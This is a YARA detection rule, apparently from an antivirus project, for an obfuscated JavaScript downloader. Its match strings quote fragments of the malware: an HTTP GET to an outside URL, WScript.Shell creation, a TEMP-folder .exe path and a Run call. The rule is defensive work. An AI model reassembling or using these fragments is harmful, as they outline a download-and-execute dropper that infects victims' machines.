rule sig_20160330_6370304ab55fb17c0de216d9747d2a73 {
  meta:
    description = "datamaliciousorder - file 20160330_6370304ab55fb17c0de216d9747d2a73.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "51e685043313711e7614f57c66d088a3ac68054bf76e74c3c764ee6e447fcd48"

  strings:
    $s1  = "_FW[_N](\"GET\", \"http://itead-europe.com/k3ias\", false);" fullword ascii
    $s2  = "function _M(_ZE, _YC){_L0 = _L0 * 1; return _ZE - _YC;};" fullword ascii
    $s3  = "var _J = function _Z() {return WScript[_F0](\"WScript\"+\".Shell\");}(), _T = 11;" fullword ascii
    $s4  = "if (_FW[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _OT(){return _DW + \"\";};" fullword ascii
    $s6  = "function _PM() {return _J[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"psMnIIWFcZg.ex\" + \"e\";};" fullword ascii
    $s7  = "function _L() {return ((_X == true) && (_X == _X0)) ? 1 : _L0;};" fullword ascii
    $s8  = "function _UT(_XB){_J[\"Run\"](_XB, _L0, _L0);};" fullword ascii
    $s9  = "function _R()" fullword ascii
    $s10 = "var _F2 = new this[\"Date\"]();" fullword ascii
    $s11 = " while (_CR){" fullword ascii
    $s12 = "function _F(){return _F0;};" fullword ascii
    $s13 = "function _BP(){return 22;};" fullword ascii
    $s14 = "return _M(_TX, _I);" fullword ascii
    $s15 = "function _ZU(_Y) {var _GI = (1, 2, 3, 4, 5, _Y); return _GI;};" fullword ascii
    $s16 = "var _G = false;" fullword ascii
    $s17 = "var _X0 = false;" fullword ascii
    $s18 = "_X0 = true; " fullword ascii
    $s19 = "var _X = false;" fullword ascii
    $s20 = "_X = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}